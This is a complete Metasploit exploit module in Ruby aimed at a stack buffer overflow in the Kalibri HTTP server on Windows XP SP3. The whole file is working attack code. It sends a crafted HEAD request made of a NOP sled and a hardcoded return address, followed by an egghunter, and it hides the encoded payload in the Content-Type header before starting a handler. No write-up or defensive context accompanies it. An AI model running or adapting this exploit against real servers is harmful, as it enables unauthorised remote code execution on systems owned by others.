require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

      include Msf::Exploit::Remote::Tcp
      include Msf::Exploit::Remote::HttpClient
      include Msf::Exploit::Egghunter

      def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Kalibri HTTP server exploit',
                        'Description'    => %q{
                                        This module exploits a stack overflow in a
                                        Kalibri HTTP server.
                                             },
                        'Author'         => [ 'Simon Uvarov' ],
                        'Version'        => '$Revision: 1.0 $',
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'seh',
                                },
                        'Payload'        =>
                                {
                                        'Space'    => 515,
                                        'BadChars' => "\x00\x0d\x0a\x3d\x20\x3f",
                                },
                        'Platform'       => 'win',

                        'Targets'        =>
                                [
                                        ['Windows XP SP3 En',
                                          { 'Ret' => 0x7C9D30D7, 'Offset' => 504 } ],
                                ],
                        'DefaultTarget' => 0,

                        'Privileged'     => false
                        ))

                        register_options(
                        [
                                Opt::RPORT(8080)
                        ], self.class)
       end

       def exploit

          print_status("Sending request...")
      	  hunter, egg = generate_egghunter(payload.encoded, payload_badchars)
      	  sploit = make_nops(515) + [target.ret].pack('V')
      	  sploit << hunter
          send_request_raw({
            'uri'     => "/" + sploit,
            'version' => '1.1',
            'method'  => 'HEAD',
            'headers' => {'Content-Type' => egg},
          })

          handler

       end

end
